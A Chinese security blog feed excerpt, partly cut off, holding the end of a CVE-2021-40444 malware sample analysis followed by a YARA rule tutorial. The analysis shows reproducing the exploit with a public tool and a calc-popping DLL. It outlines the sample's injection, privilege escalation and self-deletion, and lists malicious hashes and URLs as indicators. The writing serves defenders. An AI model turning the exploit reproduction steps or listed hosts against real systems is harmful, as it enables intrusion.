href="https://github.com/lockedbyte/CVE-2021-40444%EF%BC%8C%E5%9C%A8%E8%BF%99%E9%87%8C%E6%89%BE%E5%88%B0%E4%BA%86%E7%BD%91%E4%B8%8A%E7%9A%84%E4%BD%9C%E8%80%85%E8%A7%A3%E5%BC%80%E4%BA%86%E6%B7%B7%E6%B7%86%E5%90%8E%E7%9A%84JS%E4%BB%A3%E7%A0%81%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E5%85%B6%E8%AE%BF%E9%97%AE%E8%8E%B7%E5%8F%96cab%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E7%84%B6%E5%90%8E%E4%BC%9A%E9%80%9A%E8%BF%87%E6%89%A7%E8%A1%8Ccpl%E5%91%BD%E4%BB%A4%E5%8E%BB%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AAinf%E6%96%87%E4%BB%B6%E3%80%82">https://github.com/lockedbyte/CVE-2021-40444，在这里找到了网上的作者解开了混淆后的JS代码，可以看到其访问获取cab的路径，然后会通过执行cpl命令去执行一个inf文件。</a></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/4.png"></p><p>因为域名已经挂了，所以尝试自己复现一下漏洞，还原整个攻击流程。<a href="https://github.com/lockedbyte/CVE-2021-40444%EF%BC%8C%E5%9C%A8%E8%BF%99%E9%87%8C%E6%9C%89%E5%B7%B2%E7%BB%8F%E7%BC%96%E5%86%99%E5%A5%BD%E7%9A%84EXP%EF%BC%8C%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%88%A9%E7%94%A8%E3%80%82">https://github.com/lockedbyte/CVE-2021-40444，在这里有已经编写好的EXP，可以直接利用。</a></p><p>自己编写一个DLL，来弹出计算器。</p><figure class="highlight objectivec"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs objectivec"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-built_in">BOOL</span> APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        WinExec(<span class="hljs-string">&quot;calc.exe&quot;</span>, SW_SHOW);<span class="hljs-comment">//弹出计算器</span><br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>编译，指定自己的DLL文件和服务器地址。然后会在out目录下生成一个DOC文档。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/16.png"></p><p>在测试机打开文档，弹出计算器，效果如下</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/test.gif"></p><p>通过火绒剑监控行为，可以看到样本通过rundll32执行了命令，msword.inf就是样本中的championship.inf只是名字不同。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/17.png"></p><p>在指定目录下生成的inf文件</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/19.png"></p><p>现在分析一下championship文件，前部分有大量的复杂代码，通过fakenet判断它会尝试访问macuwf.com/get_load，因为域名已经挂了，猜测里面可能是shellcode的资源。</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/18.png"></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/5.png"></p><p>然后会获取一些函数的地址</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/6.png"></p><p>通过WMI接口来创建进程</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/7.png"></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/8.png"></p><p>遍历线程</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/9.png"></p><p>如果没有SeDebugPrivilege会尝试提权</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/10.png"></p><p>写内存</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/11.png"></p><p>APC注入</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/12.png"></p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/14.png"></p><p>最后会启动powershell删除自身</p><p><img src="/2021/09/22/CVE-2021-40444%E7%9A%84%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/13.png"></p><p>实际注入的shellcode，并没有任何意义且只有二十个字节左右，猜测是访问服务器进行下载的，因为服务器已经挂了，部分无法分析。</p><h2 id="防范建议"><a href="#防范建议" class="headerlink" title="防范建议"></a>防范建议</h2><ol><li><p>及时更新安全补丁</p></li><li><p>禁用ActiveX控件</p></li><li><p>将以下内容复制到文本文档中，保存为.reg文件并且执行</p><figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">Windows Registry Editor Version 5.00<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\0</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\1</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\2</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br><br>[HKEY_LOCAL_MACHINE<span class="hljs-symbol">\S</span>OFTWARE<span class="hljs-symbol">\P</span>olicies<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings<span class="hljs-symbol">\Z</span>ones<span class="hljs-symbol">\3</span>]<br>&quot;1001&quot;=dword:00000003<br>&quot;1004&quot;=dword:00000003<br></code></pre></div></td></tr></table></figure></li><li><p>不要轻易打开未知来源的OFFICE文件。</p></li></ol><h2 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h2><h3 id="MD5："><a href="#MD5：" class="headerlink" title="MD5："></a>MD5：</h3><p>1d2094ce85d66878ee079185e2761beb</p><p>4c80dc9fb7483214b1613957aae57e2a</p><p>faf0a0b2e0d987fd487c63f6495a9fa4</p><p>e770385f9a743ad4098f510166699305</p><h3 id="URL："><a href="#URL：" class="headerlink" title="URL："></a>URL：</h3><p><a href="http://hidusi.com/e8c76295a5f9acb7/side.html">http://hidusi.com/e8c76295a5f9acb7/side.html</a></p><p><a href="http://hidusi.com/e8c76295a5f9acb7/ministry.cab">http://hidusi.com/e8c76295a5f9acb7/ministry.cab</a></p><p><a href="http://macuwf.com/">http://macuwf.com</a></p><p><a href="http://macuwf.com/get_load">http://macuwf.com/get_load</a></p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://paper.seebug.org/1718/">https://paper.seebug.org/1718/</a></p><p><a href="https://github.com/lockedbyte/CVE-2021-40444">https://github.com/lockedbyte/CVE-2021-40444</a></p><p><a href="https://www.trendmicro.com/en_no/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html">https://www.trendmicro.com/en_no/research/21/i/remote-code-execution-zero-day--cve-2021-40444--hits-windows--tr.html</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-40444</a></p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>CVE-2021-40444</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yara规则学习笔记（二）</title>
    <link href="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <url>/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>上一篇地址 <a href="https://b1ackie.cn/2021/09/13/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/">yara规则学习笔记（一）</a></p><h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>可以使用<code>and</code>,<code>or</code>以及<code>not</code>等来进行布尔运算，关系运算符<code>&gt;=</code>,<code>&lt;=</code>,<code>&lt;</code>,<code>&gt;</code>,<code>==</code>和<code>!=</code>，算数运算符<code>+</code>,<code>-</code>,<code>*</code>,<code>\</code>,<code>%</code>，，按位运算符<code>&amp;</code>,<code>|</code>,<code>&lt;&lt;</code>,<code>&gt;&gt;</code>,<code>~</code>,<code>^</code>。</p><p>字符串标识符也可以在条件中使用，充当布尔变量，其值取决于文件中相关字符串的存在与否。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;asd&quot;</span> <br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;zxc&quot;</span><br><span class="hljs-variable">$d</span> = <span class="hljs-string">&quot;987&quot;</span><br>condition:<br>(<span class="hljs-variable">$a</span> or <span class="hljs-variable">$b</span>) and (<span class="hljs-variable">$c</span> or <span class="hljs-variable">$d</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则，$a或者$b的任何字符串命中以及同时$c或者$d命中就是满足条件。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/1.png"></p><h3 id="计数字符串"><a href="#计数字符串" class="headerlink" title="计数字符串"></a>计数字符串</h3><p>有时候不仅仅需要知道某个字符串是否存在，还需要知道该字符串在文件或者进程内存中出现了多少次。每个字符串出现的次数由一个变量表示，该变量的名称是字符串标识符，用#字符代替了$字符。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br>condition:<br><span class="hljs-comment">#a == 6 and #b &lt; 3</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>当a字符串刚好出现了六次，且b字符串出现次数小于三次。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/2.png"></p><h3 id="字符串偏移或虚拟地址"><a href="#字符串偏移或虚拟地址" class="headerlink" title="字符串偏移或虚拟地址"></a>字符串偏移或虚拟地址</h3><p>有些情况下，我们需要知道字符串是否在某个特定的偏移量文件或者进程地址空间内的某个虚拟地址，这种时候就可以使用<code>at</code>操作符。</p><figure class="highlight xquery"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xquery">rule test<br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0xA</span> <span class="hljs-keyword">and</span> <span class="hljs-variable">$b</span> <span class="hljs-keyword">at</span> <span class="hljs-number">0x10</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则是“test”在文件偏移为0xA或者是进程在虚拟地址0xA的地方，”123”同理</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/3.png"></p><p><code>at</code>是指定具体的地址，而使用<code>in</code>可以指定一个范围</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;123&quot;</span><br>condition:<br><span class="hljs-variable">$a</span> <span class="hljs-keyword">in</span> (0..10) and <span class="hljs-variable">$b</span> <span class="hljs-keyword">in</span> (10..filesize)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这条规则是a字符串在偏移为0-10的地方且b字符串在10-文件末尾的地方。</p><p>如果把123在文件的开头，test在偏移10以后的位置，那么就无法检出了。</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/4.png"></p><p>交换一下位置即可检出</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/5.png"></p><h3 id="匹配长度"><a href="#匹配长度" class="headerlink" title="匹配长度"></a>匹配长度</h3><p>在实际测试中，并不能成功，暂时还不知道为什么，先留个坑，等搞明白再写。</p><h3 id="文件大小"><a href="#文件大小" class="headerlink" title="文件大小"></a>文件大小</h3><p>字符串标识符并不是唯一可以出现在条件中的变量（规则可以在没有任何字符串定义的情况下定义），还有一些其他的特殊变量可以使用，其中之一是<code>filesize</code>，就是文件大小，大小以字节表示。</p><figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">rule <span class="hljs-class">testFileSize</span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-symbol">condition:</span><br>filesize &gt; <span class="hljs-number">5</span>KB<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这条规则只命中5KB以上大小的文件</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/6.png"></p><p>示例中后缀使用的是<code>KB</code>，还可以使用<code>MB</code></p><h3 id="可执行入口点"><a href="#可执行入口点" class="headerlink" title="可执行入口点"></a>可执行入口点</h3><p>还有一个特殊变量是entrypoint，但是现在已经弃用了，3.0版本之后都使用pe.entry_point来代替了，请注意。</p><p>关于入口点，不同编译器的入口点可能略有不同，需要自己进行分析之后再编写规则。</p><p>我的测试用程序是使用VS2019进行编译的。可以看到版本是14.29</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/7.png"></p><p>使用调试器打开，可以看到入口点，查看其十六进制数据可以看到是E8 C5030000</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/8.png"></p><p>编写规则</p><figure class="highlight puppet"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs puppet">import <span class="hljs-string">&quot;pe&quot;</span><br>rule <span class="hljs-keyword">EntryPoint</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = &#123;E8 C5 <span class="hljs-number">03</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>&#125;<br><span class="hljs-keyword">condition</span>:<br><span class="hljs-variable">$a</span> at pe.entry_point<br>&#125;<br></code></pre></div></td></tr></table></figure><p>成功检出</p><p><img src="/2021/09/14/yara%E8%A7%84%E5%88%99%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%BA%8C%EF%BC%89/9.png"></p><h3 id="访问指定位置的数据"><a href="#访问指定位置的数据" class="headerlink" title="访问指定位置的数据"></a>访问指定位置的数据</h3><p>在多数情况下，需要检测特定文件偏移量或者虚拟内存地址的数据，可以从以下的函数之一来从给定的偏移量读取数据</p><figure class="highlight stylus"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">int8</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int16</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int32</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><br><span class="hljs-function"><span class="hljs-title">uint8</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint16</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint32</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><br><span class="hljs-function"><span class="hljs-title">int8be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int16be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">int32be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><br><span class="hljs-function"><span class="hljs-title">uint8be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint16be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br><span class="hljs-function"><span class="hljs-title">uint32be</span><span class="hljs-params">(&lt;offset or virtual address&gt;)</span></span><br></code></pre></div></td></tr></table></figure><p><code>int</code>是读取8,16,32位有符号整数，<code>uint</code>是读取无符号整数，默认都是小端序，如果要读取大端序，在后面加上<code>be</code></p><p>现在来尝试编写一个检测是否是PE文件的规则，我们知道PE开头都是“MZ”，0x5A4D，然后在DOS头部的e_lfanew标识的是PE标志的偏移量，这个地址相对于MZ头偏移量是0x3C。PE标志是“PE”，0x4550，现在可以尝试编写规则。他们俩就可以标识着此文件是否是一个PE文件。</p><figure class="highlight angelscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs angelscript">rule IsPe<br>&#123;<br>condition:<br><span class="hljs-comment">//MZ,word类型</span><br><span class="hljs-built_in">uint</span>16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5A4D</span> <br><span class="hljs-comment">//e_lfanew-&gt;pe Signature &quot;PE&quot;,dword类型</span><br><span class="hljs-keyword">and</span> <span class="hljs-built_in">uint</span>32(<span class="hljs-built_in">uint</span>32(<span class="hljs-number">0x3C</span>)) == <span class="hljs-number">0x00004550</span><br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="字符串集"><a href="#字符串集" class="headerlink" title="字符串集"></a>字符串集</h3><p>在某些情况下，需要在条件中指定，至少存在多少字符串命中才符合要求，此时可以使用<code>of</code></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span><br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;test2&quot;</span><br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;test3&quot;</span><br>condition:<br>2 of (<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>,<span class="hljs-variable">$c</span>)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>这条规则要求，$a,$b,$c至少存在两个才行，任意组合都可以。</p><p>在集合中也是可以使用通配符的。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rule <span class="hljs-built_in">test</span><br>&#123;<br>strings:<br><span class="hljs-variable">$test1</span> = <span class="hljs-string">&quot;test1&quot;</span><br><span class="hljs-variable">$test2</span> = <span class="hljs-string">&quot;test2&quot;</span><br><span class="hljs-variable">$test3</span> = <span class="hljs-string">&quot;test3&quot;</span><br>condition:<br>2 of (<span class="hljs-variable">$test</span>*)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>也可以使用<code>$*</code>来表示规则中所有的字符串，也可以使用<code>them</code></p><figure class="highlight mel"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mel">rule test1<br>&#123;<br>strings:<br>$test1 = <span class="hljs-string">&quot;test1&quot;</span><br>$test2 = <span class="hljs-string">&quot;test2&quot;</span><br>$test3 = <span class="hljs-string">&quot;test3&quot;</span><br><span class="hljs-keyword">condition</span>:<br><span class="hljs-number">2</span> of ($*)<br>&#125;<br><br>rule test2<br>&#123;<br>strings:<br>$test1 = <span class="hljs-string">&quot;test1&quot;</span><br>$test2 = <span class="hljs-string">&quot;test2&quot;</span><br>$test3 = <span class="hljs-string">&quot;test3&quot;</span><br><span class="hljs-keyword">condition</span>:<br><span class="hljs-number">1</span> of them<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在上面的示例中都使用了数字常量指定条件的字符串，也可以使用其他的表达式，<code>any</code>和<code>all</code></p><blockquote><p>all of them    //所有规则中包含的字符串</p><p>any of them    //任意字符串组合都可以，至少为一条</p></blockquote><h3 id="对多个字符串应用相同条件"><a href="#对多个字符串应用相同条件" class="headerlink" title="对多个字符串应用相同条件"></a>对多个字符串应用相同条件</h3><p>还有一个功能强大的运算符<code>for..of</code>，可以对多个字符串匹配相同的条件，语法是这样的：</p><blockquote><p>for a of b : (c)</p></blockquote><p>在b字符串集合中，至少有a个字符串满足c的条件。</p><p>下面举一些例子</p><figure class="highlight elixir"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elixir"><span class="hljs-keyword">import</span> <span class="hljs-string">&quot;pe&quot;</span><br>rule test<br>&#123;<br><span class="hljs-symbol">strings:</span><br><span class="hljs-variable">$a</span> = &#123;E8 C5 03 00 00&#125;<br><span class="hljs-variable">$b</span> = &#123;E8 01 00 00 00&#125;<br><span class="hljs-symbol">condition:</span><br><span class="hljs-keyword">for</span> any of (<span class="hljs-variable">$a</span>,<span class="hljs-variable">$b</span>) : (<span class="hljs-variable">$ </span>at pe.entry_point)<br>&#125;<br></code></pre></div></td></tr></table></figure><p>上述规则，是在a,b两个字符串集合中，至少有一个满足于pe.entry_point相同的条件。</p><figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf"><span class="hljs-keyword">rule</span> test<br>&#123;<br>strings:<br><span class="hljs-variable">$a</span> = <span class="hljs-string">&quot;test1&quot;</span> <br><span class="hljs-variable">$b</span> = <span class="hljs-string">&quot;test2&quot;</span> <br><span class="hljs-variable">$c</span> = <span class="hljs-string">&quot;test3&quot;</span> <br>condition:<br><span 